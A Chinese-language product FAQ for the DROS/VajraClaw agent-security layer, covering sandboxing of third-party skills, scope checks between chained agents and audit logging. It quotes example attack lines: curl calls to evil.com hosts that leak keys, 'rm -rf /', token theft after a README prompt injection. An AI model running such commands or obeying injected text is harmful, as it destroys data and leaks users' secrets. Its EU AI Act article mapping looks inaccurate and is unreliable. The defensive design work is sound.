# DROS & VajraClaw 零信任安全治理常見問答 (FAQ)
## 針對 OpenClaw 與 Hermes Agent 生態的極客防禦實戰指南

本 FAQ 專為 **OpenClaw** 與 **Hermes Agent** 的開發者及安全極客設計，聚焦於第三方 **Skills (插件/技能)** 的夾帶污染、以及 **Multi-Agent (多智能體)** 串聯工作流中的鏈式越權與物理隔離防禦。

---

## 目錄
1. [Q1: 作為 OpenClaw / Hermes Agent 使用者，下載第三方 Skills 最怕被夾帶指令污染或惡意 System Call，VajraClaw 如何解決？](#q1-作為-openclaw--hermes-agent-使用者下載第三方-skills-最怕被夾帶指令污染或惡意-system-callvajraclaw-如何解決)
2. [Q2: 在 OpenClaw 中，如何利用 `config.yaml` 與 DROS 規則檔實施 Skills 的物理沙箱隔離？](#q2-在-openclaw-中如何利用-configyaml-與-dros-規則檔實實施-skills-的物理沙箱隔離)
3. [Q3: Hermes Agent 桌機版擁有本地 Terminal 執行權限，如何防止 AI 被間接注入（如讀取惡意 README）後在本地「執行 rm -rf 或外傳金鑰」？](#q3-hermes-agent-桌機版擁有本地-terminal-執行權限如何防止-ai-被間接注入後本地執行-rm--rf-或外傳金鑰)
4. [Q4: Multi-Agent 工作流（如 Agent A 爬蟲 -> Agent B 寫庫）最怕「連鎖污染」與「權限放大」，DROS 的 BEC Chain 憑證鏈如何運作？](#q4-multi-agent-工作流最怕連鎖污染與權限放大dros-的-bec-chain-憑證鏈如何運作)
5. [Q5: 鏈式憑證（BEC Chain）的授權交集計算公式是什麼？會不會大幅拖慢 OpenClaw / Hermes Agent 的運行效率？](#q5-鏈式憑證bec-chain的授權交集計算公式是什麼會不會大幅拖慢-openclaw--hermes-agent-的運行效率)
6. [Q6: 當 OpenClaw / Hermes Agent 協作發生安全攔找時，如何進行「不可否認性審計與責任歸責」？](#q6-當-openclaw--hermes-agent-協作發生安全攔截時如何進行不可否認性審計與責任歸責)
7. [Q7: 運行 DROS & VajraClaw 會不會改變 OpenClaw / Hermes Agent 原本的開發流程？](#q7-運行-dros--vajraclaw-會不會改變-openclaw--hermes-agent-原本的開發流程)
8. [Q8: 如果 DROS 中央控制台（Fleet Manager）或宿主機被攻破，VajraClaw 的防護規則會被強制解除而門戶大開嗎？](#q8-如果-dros-中央控制台或宿主機被攻破vajraclaw-的防護規則會被強制解除而門戶大開嗎)
9. [Q9: DROS 如何協助企業對接歐盟人工智慧法案 (EU AI Act)？有哪些明確的法律條款對照？](#q9-dros-如何協助企業對接歐盟人工智慧法案-eu-ai-act有哪些明確的法律條款對照)
10. [Q10: DROS / VajraClaw 是無狀態 (Stateless) 的，那我們怎麼知道它有沒有正常運行？有沒有當掉或『忘記執行』？](#q10-dros--vajraclaw-是無狀態-stateless-的那我們怎麼知道它有沒有正常運行有沒有當掉或忘記執行)
11. [Q11: 在沒有中央控制台的單機版（VajraClaw、VajraClaw+）環境中，管理員該如何查看日誌？需要自己去翻找資料夾嗎？](#q11-在沒有中央控制台的單機版環境中管理員該如何查看日誌需要自己去翻找資料夾嗎)
12. [Q12: DROS L1 ATR 語意清毒與 L2 Vajra 執行期合約在防範 AI 攻擊與安全治理的定位有何不同？我該如何設定與配合使用？](#q12-dros-l1-atr-語意清毒與-l2-vajra-執行期合約在防範-ai-攻擊與安全治理的定位有何不同我該如何設定與配合使用)
13. [Q13: DROS 能夠防止所有的 AI 攻擊嗎？DROS 的明確保障邊界 (Formal Boundary Definition) 與極限是什麼？](#q13-dros-能夠防止所有的-ai-攻擊嗎dros-的明確保障邊界-formal-boundary-definition-與極限是什麼)

---

### Q1: 作為 OpenClaw / Hermes Agent 使用者，下載第三方 Skills 最怕被夾帶指令污染或惡意 System Call，VajraClaw 如何解決？

*   **極客痛點**：極客們在 Marketplace 下載了第三方寫好的 Skill（如 `FormatCSV` 或 `GitHelper`）。惡意開發者可能在 Skill 的 Prompt 中埋藏指令污染，或者直接在 Python 腳本中寫了 `os.system("curl http://evil.com/leak?key=" + env_key)`。
*   **VajraClaw 物理防禦**：
    1.  **FFI 二進位攔截**：VajraClaw SDK（以 C/Go 撰寫，作為動態連結庫嵌入）橫亙在 Agent 決策引擎與操作系統之間。當遭污染的 Agent 試圖調用任何敏感工具（讀寫檔案、執行命令、網路發送）時，必須先通過 VajraClaw 的 `evaluateToolCallWithAudit()`。
    2.  **線程級 Syscall 監控**：如果惡意 Skill 試圖繞過 Agent 框架、直接在 Python 代碼中呼叫作業系統底層。DROS 的 **GuardVM** 會在內核/系統調用層級捕獲該線程的 Syscall。一旦發現未在憑證中授權，立刻發送 `SIGKILL` 物理終止進程，防範於未然。

---

### Q2: 在 OpenClaw 中，如何利用 `config.yaml` 與 DROS 規則檔實施 Skills 的物理沙箱隔離？

為了防止第三方 Skills 越權，開發者必須在 DROS 的 `config.yaml` 檔與策略清冊中，針對 `agent.skills.*` 宣告限制。

#### 實戰配置 1：編輯 `config.yaml` 啟用線程隔離
確保你的 `config.yaml` 開啟了 GuardVM 的隔離策略：
```yaml
# ====================== DROS 7.3 Skill 隔離配置 ======================
guard_vm:
  # 啟用線程級執行期隔離
  enable_thread_isolation: true
  
  # 嚴格禁止的敏感系統調用 (針對所有非內建的第三方 Skills)
  forbidden_syscalls:
    - "sys_execve"      # 嚴格禁止 Skill 執行額外的二進位程式
    - "sys_socket"      # 禁止 Skill 自行建立網路連接 (防金鑰外洩)
    
  # Skill 專屬的實體目錄讀寫白名單 (只允許在特定暫存區活動)
  allowed_sandbox_paths:
    - "./scratch"
    - "./User_Pavilion/temp"
```

#### 實戰配置 2：在規則配置（如 `vajra_rules.json`）中鎖定 Skill 憑證 (BEC)
當 OpenClaw 動態載入第三方 Skill 時，系統會為其簽發單次執行憑證 (BEC)。限制規則宣告如下：
```json
{
  "rule_id": "rule_openclaw_skills_default",
  "actor": "agent.skills.*",
  "conditions": { "action": ["read_file", "write_file", "execute_command"] },
  "constraints": {
    "paths": {
      "match": "^\\./(scratch|User_Pavilion/temp)/.*",
      "allow": true
    },
    "commands": { "match": ".*", "allow": false },
    "network": { "outbound": false }
  },
  "behavior": "DENY_AND_ALERT"
}
```
*   **提醒**：將所有非官方認證的 Skills 在載入時自動打上 `untrusted` 標籤，VajraClaw 便會自動套用上述最嚴格的 `DENY_AND_ALERT` 規則。

---

### Q3: Hermes Agent 桌機版擁有本地 Terminal 執行權限，如何防止 AI 被間接注入（如讀取惡意 README）後在本地「執行 rm -rf 或外傳金鑰」？

*   **極客痛點**：Hermes Agent 桌機版在幫你整理本地代碼庫或 Debug 時，被迫讀取了某個包含惡意指令的 Markdown 檔案。AI 被污染後，發出 Terminal 指令：`rm -rf /` 或將你的 `.git/config` 中的 Token 外傳。
*   **VajraClaw 物理防禦**：
    1.  **DFA 狀態機過濾**：Hermes Agent 的輸出與輸入 Token 流被接入 `matchTokenStreamWithAudit()`。VajraClaw 使用 C/Go 實現的高效 DFA 狀態機，能在微秒級內識別並抹除 Token 流中隱藏的危險外連 URL，讓受污染的正版 AI 無法吐出外連路徑。
    2.  **Allowed Scopes 鎖死**：即使 AI 被物理欺騙並調用了 `execute_command` 工具。VajraClaw 檢測到當前執行的 BEC 臨時憑證中，`allowed_scopes` 不包含此目錄的寫入權限，或者命令匹配了黑名單模式，VajraClaw 會直接將該調用攔截並報警，AI 產生的危險指令根本無法抵達作業系統終端。

---

### Q4: Multi-Agent 工作流（如 Agent A 爬蟲 -> Agent B 寫庫）最怕「連鎖污染」與「權限放大」，DROS 的 BEC Chain 憑證鏈如何運作？

*   **連鎖污染 (Cascade Infection)**：Agent A 讀取了惡意網頁被污染，產生了惡意輸出。它隨後調用負責寫入資料庫的 Agent B，要求其執行刪庫。傳統架構中，Agent B 信任同伴（Agent A），於是放行。
*   **DROS 的解決方案：鏈式執行憑證 (BEC Chain)**：
    DROS 要求 Agent 之間的每一次協作調用，都必須在請求頭（Header）中傳遞經密碼學簽名的 **BEC Chain**。
    當高權限的 Agent B 收到 Agent A 的請求時，VajraClaw SDK 會在攔截點自動向上追溯，提取完整呼叫鏈的憑證，進行**授權交集計算**。

---

### Q5: 鏈式憑證（BEC Chain）的授權交集計算公式是什麼？會不會大幅拖慢 OpenClaw / Hermes Agent 的運行效率？

當一個 Agent 協作鏈條為 $Agent_1 \rightarrow Agent_2 \rightarrow \dots \rightarrow Agent_n \rightarrow \text{System Tool}$ 時，VajraClaw 執行以下**動態交集授權運算**：

$$\text{Effective Scope} = \bigcap_{i=1}^{n} \text{Scope}(Agent_i)$$

#### 實例解析：
*   $Agent_A$ (低權限) Scope: `{ Read: /tmp/crawler, Call: Agent B }`
*   $Agent_B$ (高權限) Scope: `{ Read: /database/main, Write: /database/main }`
*   當被污染的 Agent A 委託 Agent B 去寫入資料庫時，VajraClaw 計算其有效交集：
    $$\text{Effective Scope} = \text{Scope}(Agent_A) \cap \text{Scope}(Agent_B) = \emptyset$$
*   由於交集為空，VajraClaw 會在 **1 毫秒內直接熔斷** 該請求，Agent B 的資料庫寫入機制根本不會被觸發。

#### 運行效率實測：
*   **零 Token 消耗**：所有憑證鏈驗證與規則比對均在本地記憶體中完成，**不調用任何遠端 LLM**。
*   **微秒級延遲**：VajraClaw 在 C/Go 底層採用 **O(1) 複雜度的 Bitmap 狀態機算法**。單次規則判定僅需 **10 至 50 微秒**，這對於動輒數百毫秒推論時間的 OpenClaw / Hermes Agent 而言，其性能損耗完全可以忽略不計。

---

### Q6: 當 OpenClaw / Hermes Agent 協作發生安全攔截時，如何進行「不可否認性審計與責任歸責」？

當極客們在跑複雜的 Multi-Agent 工作流且某個環節被 VajraClaw 熔斷時，日誌中會自動寫入經 AIA 私鑰簽章的**密碼學審計日誌**，清晰界定責任歸屬：

```json
{
  "timestamp": "2026-06-10T23:45:00Z",
  "action": "BLOCK_TOOL_CALL",
  "tool": "execute_bash_command",
  "attempted_payload": "curl http://evil-attacker.com/leak",
  "error_code": "ERR_BEC_SCOPE_VIOLATION",
  "bec_chain": [
    { "agent": "OpenClaw_DBManager_Agent", "execution_id": "exec-99b8", "sign": "0x8aef..." },
    { "agent": "OpenClaw_WebCrawler_Agent", "execution_id": "exec-124a", "sign": "0xfd42..." }
  ],
  "taint_analysis": {
    "source": "OpenClaw_WebCrawler_Agent",
    "reason": "Token Stream matched pattern [URL_OUTBOUND_LEAK] from input data stream"
  }
}
```

透過這份日誌中的 `taint_analysis`（污染源分析）與 `bec_chain`（憑證鏈條），管理員與開發者可以瞬間判定：**問題起源於 WebCrawler 導入了髒數據，而非 DBManager 叛變**。這為多智能體系統提供了無可篡改的「責任追溯鐵證」。

---

### Q7: 運行 DROS & VajraClaw 會不會改變 OpenClaw / Hermes Agent 原本的開發流程？

**幾乎無感，唯有在面臨安全攻擊時會「強制介入」。**

*   **開發無感**：開發者在撰寫 Skills 或 Multi-Agent 工作流時，不需要手動修改業務代碼去適應安全框架。只要維持原有的 Python 編寫習慣即可。
*   **配置一次，全局受惠**：唯一的改動是，在系統啟動時，DROS 會接管 Token 流與本地 Tool Call 請求的二進位分發。只有當 Skill 的行為超出 `config.yaml` 或 `rules` 宣告的物理邊界時，開發者才會在終端機看到攔截警報與 `ERR_BEC_SCOPE_VIOLATION`。
*   **這正是極客生態最需要的安全模式**——讓 AI 狂奔的同時，在系統底層裝上防鎖死煞車（ABS），在不影響開發體驗的前提下，守住最後的物理防線。

---

### Q8: 如果 DROS 中央控制台（Fleet Manager）或宿主機作業系統管理權限被駭客完全攻破，VajraClaw 的防護規則會被強制解除而門戶大開嗎？

**在系統架構上已被物理級防範。控制面板即便失守，防衛軌道也會自動鎖死！**

許多開發者會問：既然 DROS 提供了 Web 控制台來檢視或編輯規則，那萬一控制台被駭客攻破，防護不就形同虛設？

DROS 對此採取了**「開發/測試環境」與「生產環境（Production）」的權限分離與密碼學信任根隔離**，具體防禦步驟如下：

1. **環境模式分離（本地調測 vs 生產防禦）**：
   * **本地/Hacker 模式**：為了讓開發人員能快速測試，控制面板（Port 8000）開放了在界面上直接「檢視、編輯與熱編譯」 `Vajra.md` 的功能。
   * **生產模式 (Production)**：在正式生產部署中，控制面板的「編輯與熱編譯」接口（如 `POST /api/policy`）會被**物理關閉**，僅保留唯讀（Read-Only）的狀態監控與日誌審計功能。

2. **密碼學雙重簽章鎖定 (Cryptographic Signature Verification)**：
   * 在生產環境中，VajraClaw 節點在執行期載入政策二進位包 (`policy.bin`) 時，**強制執行 Ed25519 密碼學簽章驗證**。
   * 用於編譯與簽署的私鑰通常保管在離線冷金鑰或 HSM（硬體安全模組）中，**控制面板本身並不持有簽署私鑰**。
   * 即使駭客完全攻破控制台並惡意竄改 `Vajra.md` 下發規則，由於缺乏合法私鑰簽署，VajraClaw 在加載時會因簽章驗證失敗而立即觸發 **Fail-Closed 物理熔斷 (Fatal Panic)**——**強制 Agent 執行進程當機自毀**，徹底防止惡意規則生效。

3. **GitOps 變更審計工作流 (GitOps & Audit Trail)**：
   * 生產規則的變更不依賴控制台網頁按鈕，而是必須通過程式碼庫（如 Git）進行 Pull Request 審查與多方簽核，再經由自動化 CI 管道調用 HSM 進行簽章並分發至各節點。

4. **不可變唯讀底線戒律與硬體防線**：
   * 核心的安全戒律（如禁止外部未授權的系統調用）唯讀鎖死在記憶體中，中央中控台無權覆蓋或撤銷。配合硬體 TEE（如 Intel SGX、AMD SEV）的隔離，確保即使宿主機的 Root 權限失守，駭客也無法透過記憶體注入繞過已被鎖死的點陣圖規則。

**總結來說：控制面板失守，代表的只是配置管理權限的丟失，而節點上的物理防衛鐵軌則會自動鎖死。DROS 建立的不再是普通的 Agent 防火牆，而是 Agent 執行層的不可變信任根（Immutable Runtime Root of Trust）。系統只會『失效關閉（Fail-Closed）』，絕不容許『權限提升（Privilege Escalation）』。**

---

### Q9: DROS 如何協助企業對接歐盟人工智慧法案 (EU AI Act)？有哪些明確的法律條款對照？

歐盟人工智慧法案 (EU AI Act) 對自主 AI 系統的追溯性與可控性提出了明確的法律約束。DROS 的執行不可否認性模型可以直接映射到合規條款中：

**第 26 條 (Traceability & Logging - 可追溯性與日誌記錄)**：
* **合規要求**：高風險 AI 系統必須在其生命週期內自動記錄日誌，以確保可追溯性與事故原因追查。
* **DROS 方案**：DROS 將 policy.bin 的唯一 UUID、SHA-256 憑證哈希值強制綁定於每一筆攔截日誌中，為企業提供防篡改的執行決策源流憑證。

**第 28 條 (High-Risk Systems Boundaries - 高風險執行邊界)**：
* **合規要求**：必須設置技術或物理邊界，以防範 AI 系統越權或造成不可逆的實體損害。
* **DROS 方案**：DROS 卡在 FFI 通道邊界，當偵測到位元矩陣越權，VajraClaw 微核心立即實行 Strict Fail-Closed 熔斷（Panic），掐死調用。

**第 50 條 (Transparency & Accountability - 透明度與責任歸屬)**：
* **合規要求**：必須明確區分 AI 自主操作的法律責任歸屬。
* **DROS 方案**：透過 Root CA 非對稱密鑰簽章與 UUID 序號綁定，任何發出的指令都能被密碼學證明是「經過哪一個 CA 授權」，徹底釐清法律責任。

---

### Q10: DROS / VajraClaw 是無狀態 (Stateless) 的，那我們怎麼知道它有沒有正常運行？有沒有當掉或『忘記執行』防範規則？

**這正是 SRE（網站可靠性工程）與資安監控設計的核心。無狀態 (Stateless) 指的是『不保存業務與會話狀態』以追求極致效能，但並不代表『缺乏可觀測性 (Observability)』。**

DROS 設計了三重複雜的主動防護與可觀測性機制，確保安全網格隨時處於監控之下：

1. **FFI 剛性攔截（物理上無法『忘記執行』）**：
   * VajraClaw 不是一個可有可無的『旁路監控器』，而是以 SDK 函式庫或 Sidecar 的形式**強行嵌入在 Agent 呼叫 Tool 決策的唯一代碼路徑上**。這在編譯期就被代碼綁定死。Agent 若想呼叫外部工具（如資料庫或 API），就『必須』調用 VajraClaw 進行 Bitmap 校驗。如果 VajraClaw 當掉或忘記加載，呼叫鏈路就會物理中斷，回傳 Null 執行權限，Agent 根本無法執行任何動作。這就是 **Fail-Closed（預設阻斷）**。

2. **微秒級心跳（Micro-Heartbeats）與健康檢查**：
   * 運行於各 VM/容器節點的 VajraClaw Daemon 會定時向中央中控台（Fleet Manager / VajraAgent）上報微秒級心跳封包。心跳內容不包含業務隱私，僅攜帶當前節點的系統指標（CPU/記憶體）、運行狀態，以及目前加載規則的 `policy.bin` 密碼學哈希值（Hash）。中控台只要發現某個節點心跳超時（如超過 2 秒），會立刻觸發警報並調度備份節點。

3. **密碼學日誌流與『沉默警報』（Silence Alert）**：
   * 每次校驗（不論放行 ALLOW 還是阻斷 BLOCK）都會在本地生成一筆由該節點私鑰**密碼學簽名（Signature）**的審計日誌，並即時串流（Stream）回中央日誌系統。如果該 Agent 持續有對話與 API 調用，但中央系統卻『沒有收到該節點的任何簽名日誌』，日誌系統會觸發 **Silence Alert（異常沉默警報）**，判斷該節點可能遭到系統級掛起或繞過，立刻通報資安人員介入排查。

---

### Q11: 在沒有安裝 DROS 中央控制台（Fleet Manager / VajraAgent）的單機版（VajraClaw、VajraClaw+）環境中，管理員該如何查看日誌？需要自己去翻找資料夾嗎？

**不需要盲目尋找。單機版雖無中央視覺化控制台，但遵循了標準的 SRE 日誌規範與 Unix 哲學，提供了極為直觀的系統級集成。**

無中央控制台時，管理員可以透過以下三種極為標準且便利的方式查看與監控日誌：

1. **系統級統一日誌（SystemD / Journalctl）**：
   * VajraClaw 預設會將所有校驗與攔截日誌以標準 JSON 格式輸出至系統標準輸出流（stdout/stderr）。
   * 如果您是以 SystemD 服務（如 `lobster`）運行 Agent，系統會自動接管日誌。您只需在終端機輸入一行標準指令，即可實時觀看滾動日誌：
     ```bash
     journalctl -u lobster -f
     ```

2. **標準路徑與自定義日誌檔（JSON Log File）**：
   * 在配置檔（如 `openclaw.json` 或 `Vajra.json`）中，您可以自由指定一個標準路徑（例如 `log_path: "/var/log/vajraclaw/audit.json"`）。
   * VajraClaw 會自動在此路徑生成按日輪轉（Rotate）的結構化日誌檔，管理員只需使用一行標準指令即可即時監聽攔截事件：
     ```bash
     tail -f /var/log/vajraclaw/audit.json
     ```

3. **無縫對接開源日誌收集器**：
   * 由於日誌輸出是標準的單行 JSON 格式，開發者可以非常輕易地用開源的 Filebeat、Vector 或 FluentBit 收集這些日誌，直接打入企業現有的 ELK 或 Grafana Loki 中，無需任何二次開發。

---

### Q12: DROS L1 ATR 語意清毒與 L2 Vajra 執行期合約在防範 AI 攻擊與安全治理的定位有何不同？我該如何設定與配合使用？

*   **系統定位：雷達 vs. 煞車系統**
    *   **L1 ATR (Agent Threat Rules) 是雷達（Pluggable Radar）**：其核心任務是在外部輸入（如 User Query 或 RAG Context）抵達 LLM 之前進行特徵清洗與過濾。它能有效排除已知的惡意 Prompt Injection (T001) 與間接上下文污染 (T002)，降低模型被誤導的機率。
    *   **L2 Vajra Contract 是煞車與防火牆（Enforcement Firewall）**：不論 LLM 腦袋最後想出什麼，一旦它試圖執行未授權的敏感工具（T003）或讀取越界資源，VajraClaw 將在 FFI/ABI 物理邊界將其強制熔斷。
*   **實戰設定指引 (DrosGuard SDK)**：
    僅需兩行代碼即可在您的 Agent Workflow 中同時啟動這兩層防線：
    ```python
    from dros_sdk import DrosGuard

    # 初始化 DrosGuard（自動加載本地 Vajra 合約與 pluggable ATR 規則）
    guard = DrosGuard(contract_path="vajra_finance_auditor.yaml")

    # 1. 於入口處掛載 L1 語意清毒 (過濾 T001/T002 威脅)
    guard.check_query(user_query)

    # 2. 於工具執行前掛載 L2 物理阻斷 (控制 T003-T007 越權執行)
    guard.check_tool_execution(tool_name)
    guard.check_resource_access(target_path)
    ```

---

### Q13: DROS 能夠防止所有的 AI 攻擊嗎？DROS 的明確保障邊界 (Formal Boundary Definition) 與極限是什麼？

**不能，且 DROS 刻意不去做通用型的 AI 價值對齊。我們提供的是底層執行邊界的「確定性保證 (Deterministic Guarantees)」，而非不確定性的語意護欄。**

#### 1. DROS 承諾提供的安全性保證 (What DROS Guarantees)
*   **執行授權強制性 (Execution Authorization)**：任何工具或 Syscall 呼叫，在 C-FFI 邊界必須符合當前 Vajra 合約白名單，越授權必遭物理熔斷 (`SIGKILL`)。
*   **身分不可否認性 (Identity Verification)**：智能體間調用鏈以加密 BEC Chain 憑證進行身分校驗，防止偽造與混淆代理人。
*   **審計完整性 (Audit Integrity)**：產生符合 NIST OSCAL 標準的結構化防篡改審計日誌。

#### 2. DROS 不予保證的防區邊界 (What DROS Does Not Guarantee)
*   **語意正確性 (Semantic Correctness)**：DROS 不干預或修正 LLM 回答的邏輯正確度。
*   **模型對齊 (Model Alignment)**：DROS 不干涉模型的偏見、幻覺或道德審查。
*   **幻覺放行**：若 LLM 產生胡言亂語（幻覺），但其並未調用任何超出合約授權的工具或路徑，DROS 將保持放行。這極大地降低了系統的誤報率 (FPR < 2%)。

